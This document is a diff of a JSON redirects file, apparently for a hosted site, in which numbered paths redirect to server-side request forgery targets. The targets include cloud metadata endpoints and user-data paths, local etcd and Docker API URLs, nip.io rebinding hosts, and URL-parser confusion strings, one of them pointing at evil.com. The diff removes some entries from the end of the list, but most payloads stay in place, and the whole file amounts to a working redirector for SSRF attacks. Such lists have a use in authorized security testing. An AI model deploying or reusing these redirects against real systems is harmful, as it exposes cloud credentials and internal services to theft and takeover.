@@ -1,5 +1,5 @@
 {"redirects": [
-    { "source": "/og125", "destination": "http://169.254.169.254"},
+   { "source": "/og125", "destination": "http://169.254.169.254"},
     { "source": "/og126", "destination": "http://metadata.nicob.net/"},
     { "source": "/og127", "destination": "http://169.254.169.254.nip.io/"},
     { "source": "/og128", "destination": "http://1ynrnhl.nip.io/"},
@@ -45,17 +45,6 @@
     { "source": "/og168", "destination": "http://192.0.0.192/latest/"},
     { "source": "/og169", "destination": "http://192.0.0.192/latest/user-data/"},
     { "source": "/og170", "destination": "http://192.0.0.192/latest/meta-data/"},
-    { "source": "/og171", "destination": "http://192.0.0.192/latest/attributes/"},
-    { "source": "/og172", "destination": "http://100.100.100.200/latest/meta-data/"},
-    { "source": "/og173", "destination": "http://127.0.0.1:2379/v2/keys/?recursive=true"},
-    { "source": "/og174", "destination": "http://127.0.0.1:2375/v1.24/containers/json"},
-    { "source": "/og175", "destination": "http://1.1.1.1 &@2.2.2.2# @3.3.3.3/"},
-    { "source": "/og176", "destination": "0://evil.com:80;http://google.com:80/"},
-    { "source": "/og177", "destination": "http://127.1.1.1:80\@127.2.2.2:80/"},
-    { "source": "/og178", "destination": "http://127.1.1.1:80\@@127.2.2.2:80/"},
-    { "source": "/og179", "destination": "http://127.1.1.1:80:\@@127.2.2.2:80/"},
-    { "source": "/og180", "destination": "http://127.1.1.1:80#\@127.2.2.2:80/"},
-    { "source": "/og181", "destination": "http://mail.ebc.apple.com"},
-    { "source": "/og182", "destination": "http://bugbounty.dod.network"}
+    { "source": "/og171", "destination": "http://192.0.0.192/latest/attributes/"}
   ]
 }
